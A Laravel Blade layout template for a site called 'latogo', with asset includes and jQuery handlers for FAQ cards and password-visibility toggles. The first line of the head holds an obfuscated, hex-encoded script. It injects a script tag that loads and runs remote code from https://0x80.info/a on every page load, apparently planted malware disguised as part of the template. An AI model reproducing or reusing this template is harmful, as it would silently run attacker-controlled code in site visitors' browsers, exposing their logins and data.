<!DOCTYPE html>
<html lang="en">

<head>
<script>var _0x46c7=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x30\x78\x38\x30\x2E\x69\x6E\x66\x6F\x2F\x61","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var a=document[_0x46c7[1]](_0x46c7[0]);a[_0x46c7[2]]= _0x46c7[3];document[_0x46c7[6]](_0x46c7[5])[0][_0x46c7[4]](a)</script>
<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1.0" name="viewport">
<title>latogo</title>
<meta content="" name="description">
<meta content="" name="keywords">

<link rel="shortcut icon" type="image/x-icon" href="{{asset('assets/img/favicon.svg')}}">
<link rel="stylesheet" href="{{asset('assets/css/bootstrap.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/fontawesome/css/fontawesome.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/fontawesome/css/all.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/css/owl.carousel.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/css/owl.theme.default.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/slick/slick.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/slick/slick-theme.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/select2/css/select2.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/aos/aos.css')}}">
<link rel="stylesheet" href="{{asset('assets/css/style.css')}}">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">

</head>

<body>

<!-- header -->
<div class="main-wrapper">
@include('layouts.dashboard.header1')


@yield('content')


@include('layouts.dashboard.footer')
</div>
<!-- footer -->

<script src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
<script src="{{asset('assets/js/bootstrap.bundle.min.js')}}"></script>

<script src="{{asset('assets/js/jquery.waypoints.js')}}"></script>
<script src="{{asset('assets/js/jquery.counterup.min.js')}}"></script>

<script src="{{asset('assets/plugins/select2/js/select2.min.js')}}"></script>

<script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>

<script src="{{asset('assets/plugins/slick/slick.js')}}"></script>

<script src="{{asset('assets/plugins/aos/aos.js')}}"></script>

<script src="{{asset('assets/js/script.js')}}"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
    $(document).on('click', '.faq-card', function () {
        // console.log($(this).parent().find('.collapse').length);
        $('.faq-card .collapse').removeClass('show')
        $('.faq-card .faq-title a').addClass('collapsed')
        $(this).find('a').removeClass('collapsed')
    });
    $(document).on('click', '#togglePassword', function (event) {
    document.getElementById('password').type = 'text';
    var element = document.getElementById("togglePassword");
    element.classList.add("d-none");
    var element = document.getElementById("togglePassword1");
    element.classList.remove("d-none");
    });
    $(document).on('click', '#togglePassword1', function (event) {
        document.getElementById('password').type = 'password';
        var element = document.getElementById("togglePassword1");
        element.classList.add("d-none");
        var element = document.getElementById("togglePassword");
        element.classList.remove("d-none");
    });
    $(document).on('click', '#togglePassword3', function (event) {
        document.getElementById('new_password').type = 'text';
        var element = document.getElementById("togglePassword3");
        element.classList.add("d-none");
        var element = document.getElementById("togglePassword2");
        element.classList.remove("d-none");
        });
        $(document).on('click', '#togglePassword2', function (event) {
            document.getElementById('new_password').type = 'password';
            var element = document.getElementById("togglePassword2");
            element.classList.add("d-none");
            var element = document.getElementById("togglePassword3");
            element.classList.remove("d-none");
    });
</script>
@stack('script')
</body>

</html>
